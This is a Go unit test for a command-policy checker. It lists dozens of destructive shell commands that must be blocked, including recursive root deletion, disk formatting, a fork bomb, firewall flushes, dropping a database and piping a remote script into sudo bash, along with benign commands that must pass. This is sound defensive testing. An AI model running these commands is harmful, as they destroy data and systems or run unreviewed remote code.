package policy

import "testing"

func TestCheck(t *testing.T) {
	blocked := []string{
		"rm -rf /",
		"sudo rm -rf / ",
		"rm -rf --no-preserve-root /",
		"rm -fr /*",
		"rm -rf ~",
		"rm -r /etc",
		"mkfs.ext4 /dev/sdb1",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"shutdown -h now",
		"systemctl reboot",
		"reboot",
		":(){ :|:& };:",
		"iptables -F",
		"systemctl stop sshd",
		`psql -c "DROP DATABASE app"`,
		"curl -fsSL https://x.io/i.sh | sudo bash",
		"crontab -r",
		"docker system prune -a --volumes",
		"kubectl delete ns prod",
		"#!/bin/sh\necho hi\nreboot",
		"echo hi\r\nshutdown -h now",
		"/sbin/reboot",
		"/usr/sbin/shutdown -r now",
		"nohup reboot",
		`rm -rf "/"`,
		"rm -rf '/'",
		"rm -rf -- /",
		"rm --recursive --force /",
		"rm -rf /etc/*",
		"rm -rf /var/lib",
		"rm -Rf /usr/local/",
		"rm -rf //",
		"rm -rf /.",
		"rm -rf /*",
		"cd / && rm -rf *",
		"cd /; rm -rf .",
		"find / -delete",
		"find /etc -name x -exec rm {} +",
		"chmod 777 -R /",
		"chmod -R 777 /",
		"chown root:root / -R",
		"iptables --flush",
		"iptables -t nat -F",
		"sudo mkfs -t ext4 /dev/sdb",
		"echo y | mkfs.xfs /dev/sdc",
	}
	for _, c := range blocked {
		if len(Check(c, nil)) == 0 {
			t.Errorf("expected %q to be blocked", c)
		}
	}
	allowed := []string{
		"ls -la /",
		"rm -rf /tmp/build",
		"rm -rf ./node_modules",
		"systemctl restart nginx",
		"df -h /",
		"docker system prune -f",
		"grep -r reboot /var/log",
		"curl -sS https://example.com -o out.html",
		"echo shutdown-script.sh",
		"echo reboot",
		"echo hi\necho reboot",
		`grep "rm -rf /" notes.txt`,
		"rm -rf /var/lib/app/cache",
		"rm -rf -- /tmp/build",
		"grep mkfs notes.txt",
		"man mkfs.ext4",
		"cd /tmp && rm -rf *",
		"find /tmp -delete",
		"find / -name '*.log'",
		"chmod -R 755 /var/www",
		"iptables -L",
	}
	for _, c := range allowed {
		if hits := Check(c, nil); len(hits) != 0 {
			t.Errorf("expected %q to be allowed, got %v", c, hits[0].ID)
		}
	}
	if len(Check("kubectl apply -f x", []string{`kubectl\s+apply`})) != 1 {
		t.Error("custom pattern not applied")
	}
}
